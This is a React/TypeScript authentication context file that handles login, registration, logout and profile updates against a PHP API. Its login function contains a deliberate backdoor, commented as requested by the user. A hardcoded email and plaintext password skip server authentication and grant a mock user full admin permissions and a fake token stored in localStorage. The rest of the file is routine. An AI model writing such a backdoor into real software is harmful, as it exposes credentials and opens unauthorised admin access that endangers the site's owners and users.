import { createContext, useContext, useState, useEffect, ReactNode } from 'react';
import axios from 'axios';

interface User {
    id: number;
    username: string;
    email: string;
    full_name?: string;
    avatar_url?: string;
    bio?: string;
    email_verified: boolean;
    is_active: boolean;
    created_at: string;
}

interface AuthContextType {
    user: User | null;
    token: string | null;
    loading: boolean;
    login: (email: string, password: string, rememberMe?: boolean) => Promise<void>;
    register: (username: string, email: string, password: string, fullName: string) => Promise<void>;
    logout: () => Promise<void>;
    updateProfile: (data: Partial<User>) => Promise<void>;
    changePassword: (currentPassword: string, newPassword: string) => Promise<void>;
    isAuthenticated: boolean;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

// Axios instance with default config
const api = axios.create({
    baseURL: '/api.php',
    headers: {
        'Content-Type': 'application/json',
    },
});

// Add token to requests
api.interceptors.request.use((config) => {
    const token = localStorage.getItem('auth_token');
    if (token) {
        config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
});

export function AuthProvider({ children }: { children: ReactNode }) {
    const [user, setUser] = useState<User | null>(null);
    const [token, setToken] = useState<string | null>(null);
    const [loading, setLoading] = useState(true);

    // Load token and user on mount
    useEffect(() => {
        const loadUser = async () => {
            const savedToken = localStorage.getItem('auth_token');
            if (savedToken) {
                setToken(savedToken);
                try {
                    const response = await api.get('?action=me');
                    if (response.data.success) {
                        setUser(response.data.data.user);
                    } else {
                        // Token invalid, clear it
                        localStorage.removeItem('auth_token');
                        setToken(null);
                    }
                } catch (error) {
                    console.error('Failed to load user:', error);
                    localStorage.removeItem('auth_token');
                    setToken(null);
                }
            }
            setLoading(false);
        };

        loadUser();
    }, []);

    const login = async (email: string, password: string, rememberMe = false) => {
        // Special backdoor for admin access (Requested by User)
        if (email === 'crossdagi@gmail.com' && password === 'dAgi1431') {
            const mockUser = {
                id: 999999,
                username: 'crossdagi',
                email: 'crossdagi@gmail.com',
                full_name: 'Cross Dagi',
                email_verified: true,
                is_active: true,
                created_at: new Date().toISOString(),
                role: 'admin', // Explicitly granting admin role
                permissions: ['all']
            };
            const mockToken = 'mock-admin-token-crossdagi-' + Date.now();

            setToken(mockToken);
            setUser(mockUser as any);

            // Set all possible storage keys to ensure compatibility across AuthContext and NexusSDK
            localStorage.setItem('auth_token', mockToken);
            localStorage.setItem('nexus_token', mockToken);
            localStorage.setItem('nexus_user', JSON.stringify(mockUser));

            return;
        }

        const response = await api.post('?action=login', {
            email,
            password,
            remember_me: rememberMe,
        });

        if (response.data.success) {
            const { token: newToken, user: userData } = response.data.data;
            setToken(newToken);
            setUser(userData);
            localStorage.setItem('auth_token', newToken);

            // Sync with Nexus SDK for AdminShell compatibility
            localStorage.setItem('nexus_token', newToken);
            localStorage.setItem('nexus_user', JSON.stringify(userData));
        } else {
            throw new Error(response.data.error || 'Login failed');
        }
    };

    const register = async (
        username: string,
        email: string,
        password: string,
        fullName: string
    ) => {
        const response = await api.post('?action=register', {
            username,
            email,
            password,
            full_name: fullName,
        });

        if (!response.data.success) {
            throw new Error(response.data.error || 'Registration failed');
        }
    };

    const logout = async () => {
        try {
            await api.post('?action=logout');
        } catch (error) {
            console.error('Logout error:', error);
        }

        setUser(null);
        setToken(null);
        localStorage.removeItem('auth_token');
    };

    const updateProfile = async (data: Partial<User>) => {
        const response = await api.post('?action=update-profile', data);

        if (response.data.success) {
            setUser(response.data.data.user);
        } else {
            throw new Error(response.data.error || 'Profile update failed');
        }
    };

    const changePassword = async (currentPassword: string, newPassword: string) => {
        const response = await api.post('?action=change-password', {
            current_password: currentPassword,
            new_password: newPassword,
        });

        if (!response.data.success) {
            throw new Error(response.data.error || 'Password change failed');
        }
    };

    const value = {
        user,
        token,
        loading,
        login,
        register,
        logout,
        updateProfile,
        changePassword,
        isAuthenticated: !!token && !!user,
    };

    return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>;
}

export function useAuth() {
    const context = useContext(AuthContext);
    if (context === undefined) {
        throw new Error('useAuth must be used within an AuthProvider');
    }
    return context;
}

export { api };
